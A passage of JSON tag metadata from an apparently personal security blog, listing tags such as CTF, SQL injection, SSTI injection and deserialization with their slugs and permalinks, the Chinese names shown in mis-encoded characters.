éšç¬”","slug":"test-éšç¬”","permalink":"https://ethe448.github.io/tags/test-%E9%9A%8F%E7%AC%94/"}]}],"categories":[],"tags":[{"name":"éšç¬”","slug":"éšç¬”","permalink":"https://ethe448.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"webå­¦ä¹ ","slug":"webå­¦ä¹ ","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"sstiæ³¨å…¥","slug":"sstiæ³¨å…¥","permalink":"https://ethe448.github.io/tags/ssti%E6%B3%A8%E5%85%A5/"},{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://ethe448.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"test éšç¬”","slug":"test-éšç¬”","permalink":"https://ethe448.github.io/tags/test-%E9%9A%8F%E7%AC%94/"}]}